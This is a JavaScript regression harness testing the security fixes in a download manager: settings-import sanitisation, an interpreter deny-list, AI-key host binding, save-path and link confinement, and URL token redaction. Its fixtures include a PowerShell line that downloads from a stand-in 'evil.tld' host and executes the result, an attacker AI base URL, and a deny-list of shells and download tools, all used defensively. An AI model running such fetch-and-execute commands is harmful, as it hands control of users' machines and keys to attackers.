// Regression harness for the 2026-11-23 upgrade cycle — the security
// findings from the five-surface audit that were remediated here.
//
//  1. A settings IMPORT is a file, not a local action: it must not carry a
//     command to run, the host that receives the AI key, or the binary
//     yt-dlp executes.
//  2. The post-download hook refuses shells and script interpreters — the
//     deny-list now matches what the code always claimed to do.
//  3. An AI API key belongs to the host it was issued for.
//  4. The location dialog applies the same save-path confinement as the IPC
//     edge (realpath-canonicalising, so a symlink cannot escape).
//  5. open-external checks the PARSED host and path, not a string prefix.
//  6. A local web page may READ the API but may not change state.
//  7. gallery-dl is verified against the published SHA256SUMS.
//  8. A captured URL's secret-class query values never leave the machine.
//
// Run: node test/upgrade-hardening.js
'use strict';

const assert = require('assert/strict');
const fs = require('fs');
const http = require('http');
const os = require('os');
const path = require('path');

const { sanitizeImportedSettings, UNSAFE_IMPORT_KEYS } = require('../src/settings-import');
const { isInterpreterExe, interpreterRefusalReason } = require('../src/exec-safety');
const { AiService, hostOf } = require('../src/ai-service');
const { isAllowedSavePath } = require('../src/save-paths');
const jev = require('../src/jev');
const server = require('../src/server');

let pass = 0, fail = 0;
function check(name, cond, extra) {
  if (cond) { pass++; console.log('  OK   ' + name + (extra ? ' — ' + extra : '')); }
  else { fail++; console.log('  FAIL ' + name + (extra ? ' — ' + extra : '')); }
}
function eq(name, got, want) {
  check(name, got === want, `got ${JSON.stringify(got)}, want ${JSON.stringify(want)}`);
}
function readRepo(rel) {
  return fs.readFileSync(path.join(__dirname, '..', rel), 'utf8');
}

function raw(port, method, urlPath, headers = {}, body = null) {
  return new Promise((resolve, reject) => {
    const req = http.request({ host: '127.0.0.1', port, path: urlPath, method, headers }, (res) => {
      let out = '';
      res.setEncoding('utf8');
      res.on('data', (d) => { out += d; });
      res.on('end', () => {
        let parsed = null;
        try { parsed = JSON.parse(out); } catch (e) { /* non-JSON */ }
        resolve({ status: res.statusCode, headers: res.headers, body: parsed, raw: out });
      });
    });
    req.on('error', reject);
    if (body) req.end(body); else req.end();
  });
}

(async () => {
// ── 1. A settings import cannot smuggle code or a credential route ─────────
console.log('\n── 1. settings import is sanitised ──');
{
  const evil = {
    defaultSavePath: 'D:/Downloads',
    categoryPaths: { video: 'D:/Downloads/Videos' },
    postDownloadCmd: 'powershell.exe -NoProfile -Command "curl evil.tld/x | iex"',
    aiBaseURL: 'https://evil.tld/v1',
    youtubeJsRuntime: 'C:/temp/evil.exe',
    youtubeExtractorArgs: '--exec evil',
    trustedExtensionOrigins: ['chrome-extension://' + 'a'.repeat(32)],
  };
  const { payload, skipped } = sanitizeImportedSettings(evil);

  check('the post-download command is dropped', payload.postDownloadCmd === undefined);
  check('the AI base URL is dropped', payload.aiBaseURL === undefined);
  check('the extractor runtime is dropped', payload.youtubeJsRuntime === undefined);
  check('the extractor args are dropped', payload.youtubeExtractorArgs === undefined);
  check('extension trust is dropped', payload.trustedExtensionOrigins === undefined);
  check('ordinary settings survive', payload.defaultSavePath === 'D:/Downloads' && payload.categoryPaths.video === 'D:/Downloads/Videos');
  eq('the import reports what it skipped', skipped.length, 5);
  check('every skipped key is named', skipped.every((s) => typeof s.key === 'string' && typeof s.reason === 'string' && s.reason.length > 0));

  // Every unsafe key is refused on its own, too.
  const everyKey = sanitizeImportedSettings(Object.fromEntries(Object.keys(UNSAFE_IMPORT_KEYS).map((k) => [k, 'x'])));
  eq('every unsafe key is refused', everyKey.skipped.length, Object.keys(UNSAFE_IMPORT_KEYS).length);
  check('no unsafe key survives', Object.keys(UNSAFE_IMPORT_KEYS).every((k) => everyKey.payload[k] === undefined));

  const untouched = sanitizeImportedSettings({ defaultSavePath: 'D:/x', maxConcurrentDownloads: 3 });
  eq('a clean import skips nothing', untouched.skipped.length, 0);
  eq('a clean import is unchanged', untouched.payload.maxConcurrentDownloads, 3);

  const weird = sanitizeImportedSettings(null);
  check('a non-object payload is passed through', weird.payload === null && weird.skipped.length === 0);

  const mainSrc = readRepo('main.js');
  check('the import handler uses the sanitizer', /sanitizeImportedSettings\(payload\)/.test(mainSrc));
  check('the import handler still drops extension trust', /delete payload\.trustedExtensionOrigins/.test(mainSrc));
  check('the import handler reports the skipped keys', /skippedOnImport/.test(mainSrc));
}

// ── 2. The post-download hook refuses interpreters ────────────────────────
console.log('\n── 2. the interpreter deny-list ──');
{
  for (const exe of [
    'cmd.exe', 'CMD.EXE', 'command', 'powershell.exe', 'pwsh.exe', 'powershell_ise.exe',
    'wscript.exe', 'cscript.exe', 'mshta.exe', 'rundll32.exe', 'regsvr32.exe', 'wmic.exe',
    'msiexec.exe', 'python.exe', 'python3', 'py.exe', 'node.exe', 'deno.exe', 'bun.exe',
    'perl.exe', 'ruby.exe', 'php.exe', 'java.exe', 'bash', 'sh', 'zsh', 'wsl.exe',
    'curl.exe', 'wget.exe', 'bitsadmin.exe', 'certutil.exe', 'dotnet.exe', 'msbuild.exe',
  ]) {
    check(`refused: ${exe}`, isInterpreterExe(exe) === true);
  }
  for (const exe of [
    'evil.bat', 'evil.cmd', 'evil.ps1', 'evil.vbs', 'evil.js', 'evil.py', 'evil.sh', 'evil.lnk',
    'C:/Windows/System32/evil.BAT',
  ]) {
    check(`refused (script file): ${exe}`, isInterpreterExe(exe) === true);
  }
  for (const exe of [
    'MpCmdRun.exe', 'C:/Program Files/Windows Defender/MpCmdRun.exe', 'C:/tools/scan.exe',
    'vssadmin.exe', 'robocopy.exe',
  ]) {
    check(`allowed (direct tool): ${exe}`, isInterpreterExe(exe) === false);
  }
  check('an empty command is not an interpreter', isInterpreterExe('') === false);
  check('the refusal message names the command', /Refused/.test(interpreterRefusalReason('cmd.exe')));

  const mgrSrc = readRepo('src/download-manager.js');
  check('the manager uses the shared rule', /require\('\.\/exec-safety'\)/.test(mgrSrc));
  check('the manager refuses with the shared message', /interpreterRefusalReason\(exe\)/.test(mgrSrc));
}

// ── 3. An AI key belongs to its host ───────────────────────────────────────
console.log('\n── 3. the AI key follows its host ──');
{
  const svc = new AiService({ baseURL: 'https://tokenharbor.ai/v1', apiKey: 'secret-key-123' });
  check('the service is configured', svc.isConfigured());
  svc.configure({ baseURL: 'https://evil.tld/v1' });
  check('a host change drops the stored key', svc.isConfigured() === false);
  check('the base URL did change', svc.baseURL === 'https://evil.tld/v1');

  svc.configure({ apiKey: 'fresh-key-456' });
  check('a key typed for the new host is accepted', svc.isConfigured() === true);

  svc.configure({ baseURL: 'https://tokenharbor.ai/v1' });
  check('moving back to the original host also drops the key', svc.isConfigured() === false);

  const same = new AiService({ baseURL: 'https://tokenharbor.ai/v1', apiKey: 'secret-key-123' });
  same.configure({ baseURL: 'https://tokenharbor.ai/v2' });
  check('a path change on the same host keeps the key', same.isConfigured() === true);

  eq('hostOf reads the host', hostOf('https://tokenharbor.ai/v1'), 'tokenharbor.ai');
  eq('hostOf tolerates junk', hostOf('not a url'), '');

  const mainSrc = readRepo('main.js');
  check('the environment key is bound to the default host',
    /usingDefaultHost/.test(mainSrc) && /usingDefaultHost \? envKey : ''/.test(mainSrc));
  check('a base-URL change clears the stored key',
    /hostOf\(payload\.aiBaseURL\) !== hostOf\(current\.aiBaseURL\)/.test(mainSrc) && /payload\.aiApiKey = ''/.test(mainSrc));
}

// ── 4. The location dialog applies the same confinement ───────────────────
console.log('\n── 4. the location dialog cannot escape the save roots ──');
{
  const TMP = fs.mkdtempSync(path.join(os.tmpdir(), 'aidm-loc-'));
  try {
    const root = path.join(TMP, 'downloads');
    const outside = path.join(TMP, 'outside');
    fs.mkdirSync(root); fs.mkdirSync(outside);
    const settings = { defaultSavePath: root, categoryPaths: {} };

    check('a path inside the root is allowed', isAllowedSavePath(settings, path.join(root, 'a.mp4'), []) === true);
    check('a path outside the root is refused', isAllowedSavePath(settings, outside, []) === false);
    check('a natively browsed folder is allowed', isAllowedSavePath(settings, path.join(outside, 'a.mp4'), [outside]) === true);

    // A symlink inside the root must not become a door to the outside.
    const link = path.join(root, 'escape');
    fs.symlinkSync(outside, link, process.platform === 'win32' ? 'junction' : 'dir');
    check('a symlink inside the root cannot escape', isAllowedSavePath(settings, path.join(link, 'a.mp4'), []) === false);

    const dlgSrc = readRepo('src/location-dialog.js');
    check('the dialog checks the save path itself', /isAllowedSavePath\(settings, result\.savePath/.test(dlgSrc));
    check('a refused path rejects the download', /dm\.rejectDownload\(item\.id\)/.test(dlgSrc));
    check('a natively browsed folder is remembered', /browsedFolders\.add\(picked\)/.test(dlgSrc));
  } finally {
    fs.rmSync(TMP, { recursive: true, force: true });
  }
}

// ── 5. open-external checks the parsed host and path ──────────────────────
console.log('\n── 5. the external-link allowlist ──');
{
  const mainSrc = readRepo('main.js');
  check('the allowlist is host + path, not a prefix',
    /ALLOWED_EXTERNAL_HOST/.test(mainSrc) && /ALLOWED_EXTERNAL_PATH_PREFIX/.test(mainSrc));
  check('the protocol must be https', /parsed\.protocol !== 'https:'/.test(mainSrc));
  check('the host is compared exactly', /parsed\.hostname\.toLowerCase\(\) !== ALLOWED_EXTERNAL_HOST/.test(mainSrc));
  check('a traversal path cannot pass the prefix check',
    /parsed\.pathname\.startsWith\(ALLOWED_EXTERNAL_PATH_PREFIX\)/.test(mainSrc));
}

// ── 6. A local web page may read, not write ───────────────────────────────
console.log('\n── 6. a localhost page is trusted for reads only ──');
{
  const dm = {
    settings: { defaultSavePath: 'D:/Downloads', categoryPaths: {}, trustedExtensionOrigins: [] },
    getSettings() { return this.settings; },
    getAllDownloads: () => [],
    addDownload: (opts) => ({ id: 'stub-1', ...opts }),
    emit: () => {},
  };
  const srv = new server.IPCServer(dm, { pairedOrigins: () => [] });
  srv.port = 19841 + Math.floor(Math.random() * 40);
  await new Promise((resolve) => { srv.start(); setTimeout(resolve, 300); });
  try {
    const host = { Host: '127.0.0.1:' + srv.port };
    const read = await raw(srv.port, 'GET', '/api/status', { ...host, Origin: 'http://localhost:5173' });
    check('a local page may READ', read.status === 200, 'status=' + read.status);

    const write = await raw(srv.port, 'POST', '/api/download',
      { ...host, Origin: 'http://localhost:5173', 'Content-Type': 'application/json' },
      JSON.stringify({ url: 'https://example.test/a.zip' }));
    check('a local page may NOT change state', write.status === 403, 'status=' + write.status);
    check('the refusal names the reason', write.body && /state changes/.test(String(write.body.error)), JSON.stringify(write.body));

    const native = await raw(srv.port, 'POST', '/api/download',
      { ...host, 'Content-Type': 'application/json' },
      JSON.stringify({ url: 'https://example.test/a.zip' }));
    check('a native caller (no Origin) still works', native.status === 200, 'status=' + native.status);

    const serverSrc = readRepo('src/server.js');
    check('the rule is enforced before routing',
      /isLocalHttpOrigin\(origin\) && req\.method !== 'GET'/.test(serverSrc));
  } finally {
    srv.stop();
  }
}

// ── 7. gallery-dl is checksum-verified ────────────────────────────────────
console.log('\n── 7. gallery-dl checksum verification ──');
{
  const gdlSrc = readRepo('src/gallery-dl.js');
  check('the release carries a sums URL', /sumsUrl/.test(gdlSrc));
  check('the sums are parsed', /function parseSums\(/.test(gdlSrc));
  check('the digest is compared', /Checksum mismatch/.test(gdlSrc));
  check('verification happens BEFORE the binary is executed',
    /Checksum mismatch/.test(gdlSrc) && gdlSrc.indexOf('Checksum mismatch') < gdlSrc.indexOf('runOnce([staging]'));
  check('the release API is the one that publishes SHA256SUMS',
    /CODEBERG_API/.test(gdlSrc) && /name === 'SHA256SUMS'/.test(gdlSrc));
}

// ── 8. Secret-class query values never leave the machine ──────────────────
console.log('\n── 8. captured URLs are redacted before they are sent ──');
{
  const url = 'https://cdn.test/video.mp4?token=abcdef123456&validto=1799999999&quality=hd&itag=22';
  const redacted = jev.redactUrl(url);
  check('the token value is gone', !redacted.includes('abcdef123456'), redacted);
  check('the token NAME is kept (the model still sees a signed URL)', redacted.includes('token=REDACTED'), redacted);
  check('an expiry token is redacted too', !redacted.includes('1799999999'), redacted);
  check('an ordinary parameter is untouched', redacted.includes('quality=hd') && redacted.includes('itag=22'), redacted);

  const anatomy = jev.describeUrl(url);
  check('the anatomy carries no secret', !anatomy.includes('abcdef123456'), anatomy);
  check('the anatomy still shows the query shape', anatomy.includes('query:'), anatomy);

  const plain = 'https://cdn.test/video.mp4';
  eq('a URL without a query is unchanged', jev.redactUrl(plain), plain);
}

// ── 9. The main window refuses to navigate ────────────────────────────────
console.log('\n── 9. the Electron window is locked to the app UI ──');
{
  const mainSrc = readRepo('main.js');
  check('navigation is refused', /on\('will-navigate',[\s\S]{0,200}?preventDefault\(\)/.test(mainSrc));
  check('new windows are denied', /setWindowOpenHandler\(\(\) => \(\{ action: 'deny' \}\)\)/.test(mainSrc));
  check('sandbox is explicit', /sandbox: true/.test(mainSrc));
}

console.log(`\n${pass} passed, ${fail} failed`);
process.exit(fail ? 1 : 0);
})().catch((err) => {
  console.error(err);
  process.exit(1);
});
